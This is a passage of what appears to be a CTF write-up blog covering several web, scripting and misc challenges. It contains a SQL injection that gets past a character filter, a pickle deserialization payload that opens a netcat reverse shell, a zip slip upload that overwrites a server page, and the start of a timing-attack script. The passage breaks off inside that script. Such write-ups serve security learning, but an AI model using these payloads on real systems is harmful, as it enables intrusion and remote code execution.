+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT data FROM files WHERE filename=?&#34;</span><span class="p">,(</span><span class="n">filename</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">file_data</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">file_data</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;File not found&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;files&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">file_blob</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">file_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>    
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">file_blob</span><span class="p">),</span> <span class="n">download_name</span><span class="o">=</span><span class="n">filename</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">TypeError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;ERROR: Failed to retrieve file. Are you trying to hack us?!?&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;files&#39;</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can also see in the code that when fetching the file it deserializes it using pickle.</p>
+<p>So with this information, I solved by doing the following:</p>
+<ol>
+<li>Adding a valid session to the <code>activesessions</code> table.</li>
+<li>Adding a pickle RCE payload to the <code>files</code> table.</li>
+</ol>
+<h3 id="adding-a-valid-session-to-the-db" class="headerLink">
+    <a href="#adding-a-valid-session-to-the-db" class="header-mark"></a>Adding a valid session to the DB</h3><p>Since we know that the <code>executeScript</code> allows multiple statements. We can add an <code>INSERT</code> after the initial <code>SELECT</code> statement. However we still have to bypass the input sanitation inplaced as the inputs are passed in the <code>DBClean</code> function.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">DBClean</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">bad_char</span> <span class="ow">in</span> <span class="s2">&#34; &#39;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">string</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">bad_char</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To bypass we can just fill in with comments and backslash <code>\</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="c1">-- input
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">INSERT</span><span class="cm">/**/</span><span class="k">INTO</span><span class="cm">/**/</span><span class="k">table</span><span class="p">(</span><span class="n">col</span><span class="p">)</span><span class="cm">/**/</span><span class="k">VALUES</span><span class="p">(</span><span class="err">\</span><span class="n">val</span><span class="err">\</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">-- is simply
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="k">table</span><span class="p">(</span><span class="n">col</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="p">(</span><span class="s1">&#39;val&#39;</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can supply an arbitrary username and add our payload in the password like so.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">password\;INSERT/**/INTO/**/activesessions(sessionid)/**/VALUES(1337);--
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Note: We can verify if the session is inserted by going to <code>/download/flag.txt/1337</code>. and the error is not &ldquo;No active sessions found&rdquo;</p>
+<h3 id="exploiting-using-pickle-rce" class="headerLink">
+    <a href="#exploiting-using-pickle-rce" class="header-mark"></a>Exploiting using Pickle RCE</h3><p>I was  stuck trying to exfiltrate using boolean based to determine if the database is the same as provided. Once confirmed, I  thought that reading a mangled flag.txt is the challenge or trying to read from a different table. Then I noticed that it is using pickle library for files which can be vulnerable to <strong>deserialization</strong> attacks .</p>
+<p>Create generic Pickle RCE payload. There are online guides out there but this is generally what it looks like.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span><span class="o">,</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">PickleRCE</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">payload</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pickle_dump</span><span class="p">(</span><span class="n">obj</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">obj</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pickled</span> <span class="o">=</span> <span class="n">PickleRCE</span><span class="p">(</span><span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc </span><span class="si">{ip}</span><span class="s2"> </span><span class="si">{port}</span><span class="s2"> &gt;/tmp/f&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pickle_dump</span><span class="p">(</span><span class="n">pickled</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To add this file on the database, we can just use the previous entry point in the password like in the previous payload inserting into <code>files</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">password</span><span class="err">\</span><span class="p">;</span><span class="k">INSERT</span><span class="cm">/**/</span><span class="k">INTO</span><span class="cm">/**/</span><span class="n">files</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="k">data</span><span class="p">)</span><span class="cm">/**/</span><span class="k">VALUES</span><span class="cm">/**/</span><span class="p">(</span><span class="err">\</span><span class="n">pickle</span><span class="p">.</span><span class="n">rce</span><span class="err">\</span><span class="p">,</span><span class="err">\</span><span class="n">gASV</span><span class="p">....</span><span class="n">SFlFKULg</span><span class="o">==</span><span class="err">\</span><span class="p">);</span><span class="c1">--
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Setup a listener <code>nc -nvlp &lt;port&gt;</code></p>
+<p>To trigger this pickle RCE we just have to navigate to <code>/download/pickle.rce/1337</code>. this depends on the inserted values on the database. Check the listener and well get the shell and find the flag under root.</p>
+<p><figure><a class="lightgallery" href="/huntress-ctf-2024/movable-flag.png" title="alt text" data-thumbnail="/huntress-ctf-2024/movable-flag.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/movable-flag.png"
+            srcset="/huntress-ctf-2024/movable-flag.png, /huntress-ctf-2024/movable-flag.png 1.5x, /huntress-ctf-2024/movable-flag.png 2x"
+            sizes="auto"
+            alt="alt text" height="372"  width="893" >
+    </a></figure></p>
+<h2 id="zippy-392-pts" class="headerLink">
+    <a href="#zippy-392-pts" class="header-mark"></a>Zippy (392 pts)</h2><p>The web applications main functionality is the upload and extraction of ZIP files contents.</p>
+<p><figure><a class="lightgallery" href="/huntress-ctf-2024/zippy-web.png" title="alt text" data-thumbnail="/huntress-ctf-2024/zippy-web.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/zippy-web.png"
+            srcset="/huntress-ctf-2024/zippy-web.png, /huntress-ctf-2024/zippy-web.png 1.5x, /huntress-ctf-2024/zippy-web.png 2x"
+            sizes="auto"
+            alt="alt text" height="792"  width="1351" >
+    </a></figure>
+We can upload zip files in the <code>/Upload</code> and browse directories and filenames under <code>/Browse</code>.<br>
+Additionally we can observe the backend is asp.net Razor pages when we check the <code>/Logs</code></p>
+<blockquote>
+<p>I searched for File upload attacks regarding zip files and found the <strong>zip slip vulnerability</strong> and found a guide online <a href="https://infosecwriteups.com/zip-slip-vulnerability-064d46ca42e5" target="_blank" rel="noopener noreferrer">https://infosecwriteups.com/zip-slip-vulnerability-064d46ca42e5</a></p>
+</blockquote>
+<p>I used this vulnerability to change the code of the <code>Browse.cshtml</code> Razor page that allowed me to view the contents of files in the server.</p>
+<ol>
+<li>Create (Generate using ChatGPT) a <code>Browse.cshtml</code> that expects <code>file</code> query parameter that outputs the file passed as argument.</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="n">@page</span>
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Get the file name from the query parameter</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">fileName</span> <span class="p">=</span> <span class="n">Request</span><span class="p">.</span><span class="n">Query</span><span class="p">[</span><span class="s">&#34;file&#34;</span><span class="p">].</span><span class="n">ToString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">var</span> <span class="n">filePath</span> <span class="p">=</span> <span class="s">$&#34;/app/{fileName}&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="n">fileContent</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Check if the file exists and read its content</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="n">filePath</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fileContent</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">File</span><span class="p">.</span><span class="n">ReadAllText</span><span class="p">(</span><span class="n">filePath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fileContent</span> <span class="p">=</span> <span class="s">&#34;The specified file does not exist.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">h1</span><span class="p">&gt;</span><span class="n">Browse</span> <span class="n">File</span> <span class="n">Content</span><span class="p">&lt;/</span><span class="n">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">p</span><span class="p">&gt;</span><span class="n">@fileContent</span><span class="p">&lt;/</span><span class="n">p</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>Create malicious <code>browse.zip</code> that will replace the application <code>/app/Pages/Browse.cshtml</code></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zip browse.zip ../../../Pages/Browse.cshtml
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>
+<p>Upload the malicious zip file.</p>
+</li>
+<li>
+<p>Visit the <code>/Browse</code> endpoint and notice the page is replaced with our malicious cshtml file. We can get the flag via<code>?file=flag.txt</code></p>
+</li>
+</ol>
+<p><figure><a class="lightgallery" href="/huntress-ctf-2024/zippy-flagg.png" title="alt text" data-thumbnail="/huntress-ctf-2024/zippy-flagg.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/zippy-flagg.png"
+            srcset="/huntress-ctf-2024/zippy-flagg.png, /huntress-ctf-2024/zippy-flagg.png 1.5x, /huntress-ctf-2024/zippy-flagg.png 2x"
+            sizes="auto"
+            alt="alt text" height="335"  width="1215" >
+    </a></figure></p>
+<hr>
+<h1 id="scripting" class="headerLink">
+    <a href="#scripting" class="header-mark"></a>Scripting</h1><h2 id="base64by32-50-pts" class="headerLink">
+    <a href="#base64by32-50-pts" class="header-mark"></a>base64by32 (50 pts)</h2><p>We are given a text file in base64, if we decode the output is still base64. Create a script that can decode it in base64 until it encountered an error</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">b64</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;base64by32&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b64</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">b64</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">b64</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">b64</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="echo-chamber-50-pts" class="headerLink">
+    <a href="#echo-chamber-50-pts" class="header-mark"></a>Echo Chamber (50 pts)</h2><p>We are given pcap file. If we open it in wireshark and observe the request/responses we can see some repetitive bytes at the end of the packets.</p>
+<p><figure><a class="lightgallery" href="/huntress-ctf-2024/pcap.png" title="alt text" data-thumbnail="/huntress-ctf-2024/pcap.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/pcap.png"
+            srcset="/huntress-ctf-2024/pcap.png, /huntress-ctf-2024/pcap.png 1.5x, /huntress-ctf-2024/pcap.png 2x"
+            sizes="auto"
+            alt="alt text" height="970"  width="1913" >
+    </a></figure>
+First packet shows a repetitive <code>89</code> bytes at the end. Succeeding packets shows <code>89 50 4E</code> indicating that there might be a PNG file being sent.</p>
+<p>quick reference for magic numbers:
+<a href="https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5" target="_blank" rel="noopener noreferrer">https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5</a></p>
+<p>The packets on last bytes when combined will look like this forming the flag.
+<figure><a class="lightgallery" href="/huntress-ctf-2024/packets.png" title="alt text" data-thumbnail="/huntress-ctf-2024/packets.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/packets.png"
+            srcset="/huntress-ctf-2024/packets.png, /huntress-ctf-2024/packets.png 1.5x, /huntress-ctf-2024/packets.png 2x"
+            sizes="auto"
+            alt="alt text" height="530"  width="899" >
+    </a></figure></p>
+<p>To solve we this, we can create a python script parsing the last few bytes and write it to a <code>PNG</code> file. I utilized <a href="https://github.com/KimiNewt/pyshark" target="_blank" rel="noopener noreferrer">https://github.com/KimiNewt/pyshark</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pyshark</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">file</span> <span class="o">=</span> <span class="s2">&#34;echo_chamber.pcap&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">cap</span> <span class="o">=</span> <span class="n">pyshark</span><span class="o">.</span><span class="n">FileCapture</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">hexdump</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">pkt</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">cap</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># get the last byte</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="s2">&#34;icmp&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">data</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hexdump</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="n">hexdump</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">hexdump</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hexdump</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># write to png</span>
+</span></span><span class="line"><span class="cl"><span class="n">byte_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hexdump</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag.png&#34;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">byte_data</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<h1 id="misc" class="headerLink">
+    <a href="#misc" class="header-mark"></a>Misc</h1><h2 id="time-will-tell-241-pts" class="headerLink">
+    <a href="#time-will-tell-241-pts" class="header-mark"></a>Time will tell (241 pts)</h2><p>This is a challenge about trying to guess a randomly generated 8 hexadecimal characters. The important code here is in the check_guess function where it does a <code>do_heavy_compute()</code> if the character from our guess matches with the solution.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_guess</span><span class="p">(</span><span class="n">guess</span><span class="p">,</span> <span class="n">realdeal</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    validate if the given guess matches what&#39;s known
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">guess</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">len</span><span class="p">(</span><span class="n">realdeal</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#print(len(guess), len(realdeal))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="n">do_heavy_compute</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">guess</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">guess</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">==</span> <span class="n">realdeal</span><span class="p">[</span><span class="n">idx</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">do_heavy_compute</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I have read some writeups regarding timing attacks and relying on the delay on responses. Seeing the source code makes it more understandable how these type of attacks work.</p>
+<p>For more context the <code>do_heavy_compute()</code> function is just set on a <code>time.sleep(0.1)</code> for this challenge.</p>
+<p>Constructing the solution. First we can start a connection using pwntools and print the first few lines. and send a basic guess.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;challenge.ctf.games&#39;</span><span class="p">,</span> <span class="mi">30390</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># initial question</span>
